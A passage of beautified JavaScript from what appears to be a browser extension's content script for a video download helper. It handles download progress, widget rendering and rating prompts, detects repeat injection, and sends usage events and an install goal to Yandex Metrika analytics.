                    evt.url && (!downloadPlan.chunks[evt.url] || downloadPlan.chunks[evt.url] < evt.loaded) && downloadPlan && downloadPlan.chunks && (downloadPlan.chunks[evt.url] = evt.loaded),
                        evt.muxed && (downloadPlan.muxed = evt.muxed),
                        calculateAndSetProgress(downloadPlan);
                }),
                    addListener("progress", (evt) => {
                        evt.url && downloadPlan && downloadPlan.chunks && (!downloadPlan.chunks[evt.url] || downloadPlan.chunks[evt.url] < evt.loaded) && (downloadPlan.chunks[evt.url] = evt.loaded), calculateAndSetProgress(downloadPlan);
                    }),
                    ((eventRouter, store, sendDumpHandler) => {
                        const updateMediaInfo = get_update_media_info(store),
                            {
                                setIsWebextDestroyed: setIsWebextDestroyed,
                                setStatus: setStatus,
                                setBodyScrollbarWidth: setBodyScrollbarWidth,
                                setHelpState: setHelpState,
                                incrementDownloads: incrementDownloads,
                                incrementDownloadedInRow: incrementDownloadedInRow,
                                incrementScreenshots: incrementScreenshots,
                                resetDownloadedInRow: resetDownloadedInRow,
                                resetProgress: resetProgress,
                                sendEvent: sendEvent,
                                setIsPreviousDownloading: setIsPreviousDownloading,
                            } = store.getState(),
                            renderWidget = render_widget(store);
                        let oldStatus;
                        eventRouter.on("locationChanged", (widgetContainer) => {
                            console.log("locationChanged!!!"), widgetContainer && !document.body.contains(widgetContainer) && eventRouter.emit("renderWidgetRequest", widgetContainer);
                        }),
                            eventRouter.on("webextIsDestroyed", () => setIsWebextDestroyed(!0)),
                            eventRouter.on("webextIsCreated", () => setIsWebextDestroyed(!1)),
                            eventRouter.on("updateMediaInfoRequest", () => {
                                console.log("updateMediaInfoRequest!!!");
                                const { status: status } = store.getState();
                                (oldStatus = status), update_black_list(), updateMediaInfo();
                            }),
                            eventRouter.on("rawMediaInfo", (mediaInfo) => send_mk_data(mediaInfo, store)),
                            eventRouter.on("mediaInfo", (mediaInfo, token) => {
                                let guard;
                                console.log("MEDIA INFO EVENT!!!", mediaInfo),
                                    set_media_info(store, token, mediaInfo),
                                    oldStatus && "downloading" === oldStatus ? (setIsPreviousDownloading(!0), setStatus(oldStatus)) : setStatus(get_default_status(mediaInfo));
                                const { expires: expires } = mediaInfo;
                                if (expires && Number.isInteger(expires)) {
                                    const timestamp = Math.floor(Date.now() / 1e3);
                                    if (expires > timestamp) {
                                        console.log(`video info will be updated after ${((expires - timestamp) / 60).toFixed(1)} minutes`);
                                        const delta = 1e3 * (expires - timestamp);
                                        guard && clearTimeout(guard), (guard = setTimeout(() => eventRouter.emit("updateMediaInfoRequest"), delta));
                                    } else guard = setTimeout(() => eventRouter.emit("updateMediaInfoRequest"), 216e5);
                                }
                            }),
                            eventRouter.on("updateInfo_failure", () => {
                                console.log("UPDATE INFO FAILURE!!!"), sendEvent({ action: "updateInfo_failure" }), sendEvent({ action: "button_limited" });
                            }),
                            eventRouter.on("hit", () => {}),
                            eventRouter.on("renderWidgetRequest", (widgetContainer) => {
                                console.log("renderWidgetRequest!!!", widgetContainer), sendDumpHandler && clearTimeout(sendDumpHandler);
                                const bodyScrollbarWidth = window.innerWidth - document.documentElement.clientWidth;
                                setBodyScrollbarWidth(bodyScrollbarWidth), setHelpState(void 0), sendEvent({ action: "insertWidget" });
                                const { module: module } = store.getState(),
                                    { Widget: Widget } = module;
                                renderWidget(Widget, widgetContainer);
                            });
                        const restoreStatus = () => {
                            const { info: info } = store.getState();
                            (oldStatus = get_default_status(info)), setStatus(oldStatus), resetProgress(), setIsPreviousDownloading(!1);
                        };
                        eventRouter.on("fileSaved", () => {
                            incrementDownloads(), incrementDownloadedInRow(), check_rating_modal(store), restoreStatus();
                        }),
                            eventRouter.on("screenshoted", () => {
                                sendEvent({ action: "snap" }), incrementScreenshots(), check_rating_modal(store);
                            }),
                            eventRouter.on("showModal", (format) => {
                                const { setRatingModalLastNotNow: setRatingModalLastNotNow } = store.getState();
                                sendEvent({ action: "showModal", format: format }), setRatingModalLastNotNow(Date.now());
                            }),
                            eventRouter.on("userRedirectedToStore", (format) => {
                                const { setRatingModalNeverShow: setRatingModalNeverShow } = store.getState();
                                sendEvent({ action: "redirectedToStore", format: format }), setRatingModalNeverShow(!0);
                            }),
                            eventRouter.on("cancelDownloading", () => {
                                sendEvent({ action: "download_canceled" }), resetProgress(), resetDownloadedInRow(), restoreStatus();
                            }),
                            eventRouter.on("downloadError", () => {
                                resetProgress(), resetDownloadedInRow(), setStatus("downloadError"), sendEvent({ action: "download_error" });
                            }),
                            eventRouter.on("newPublicId", (id) => {
                                const { addPublicId: addPublicId } = store.getState();
                                addPublicId(id);
                            });
                    })(eventRouter, store, sendDumpHandler);
            };
        const hitYaMetrika = async (ymOptions) => {
            if (!(await index_ext.get("installReported"))) {
                const yaMetrika = (function (settings) {
                    return new ya_metrika_Counter(settings);
                })(ymOptions);
                try {
                    (await yaMetrika.reachGoal("udl-helper-script-install-online")) && index_ext.set("installReported", !0);
                } catch (e) {
                    console.log("ERROR WHILE REPORT!!!", e);
                }
            }
        };
        var check_if_injected = () => {
            const injected = Array.from(document.querySelectorAll("head style"))
                .map((element) => element.id)
                .filter((id) => id)
                .some((key) => {
                    try {
                        const str = atob(key),
                            num = parseInt(str, 10);
                        return num % 19999999999999 == 19999999;
                    } catch (e) {
                        return !1;
                    }
                });
            return (
                injected ||
                    (() => {
                        const k = Math.floor(100 * Math.random()),
                            tag = btoa("" + (19999999999999 * k + 19999999)),
                            style = document.createElement("style");
                        (style.id = tag), document.head.appendChild(style);
                    })(),
                injected
            );
        };
        const { project: project, platform: index_ext_platform, dist: index_ext_dist } = config.a;
        console.log(`content-script-dev: ${project}-${index_ext_platform}-${index_ext_dist}`);
        (async () => {
            in_iframe() ||
                (() => {
                    const { info: info } = config.a;
                    if (info) {
                        const { hostname: hostname } = window.location;
                        if (
                            info.hostnames.some((item) => {
                                const { starts: starts, ends: ends } = item;
                                return (starts && ends && hostname.startsWith(starts) && hostname.endsWith(ends)) || ("string" == typeof item && hostname === item);
                            })
                        ) {
                            const { name: name } = info,
                                { hash: hash, type: type, version: version } = config.a,
                                data = { hash: hash, type: type, version: version };
                            unsafe_window.set(name, data), console.log(`window.${name}:`, data);
                        }
                    }
                })();
            const onContentLoaded = () => {
                check_if_injected() ||
                    (async (disableYaMetrika) => {
                        console.log("check services");
                        const modules = integration_modules(),
                            modulesNames = Object.keys(modules);
                        for (let i = 0; i < modulesNames.length; i++) {
                            const module = modules[modulesNames[i]],
                                { Service: Service, isServiceUrl: isServiceUrl } = module;
                            if (isServiceUrl(window.location.href)) {
                                console.log("We've got a hit!!!");
                                const service = new Service();
                                await src_migrations();
                                const sendDumpHandler = setTimeout(send_dump, 2e4),
                                    store = await src_store(),
                                    { yandexMetrikaId: yandexMetrikaId } = config.a;
                                if (!disableYaMetrika && yandexMetrikaId) {
                                    const { utm: utm } = store.getState();
                                    hitYaMetrika({ utm: utm, id: yandexMetrikaId });
                                }
                                const { setEventRouter: setEventRouter, setServiceName: setServiceName, sendEvent: sendEvent, setModule: setModule } = store.getState();
                                setModule(module), setServiceName(service.serviceName), send_daily(sendEvent);
                                const eventRouter = new eventemitter3_default.a();
                                service.setEventRouter(eventRouter), setEventRouter(eventRouter), set_events_listeners_index_ext(eventRouter, store, sendDumpHandler), service.start();
                            }
                        }
                    })();
            };
            "loading" !== document.readyState
                ? onContentLoaded()
                : document.addEventListener(
                      "DOMContentLoaded",
                      () => {
                          onContentLoaded();
                      },
                      !1
                  );
        })();
    },
]);
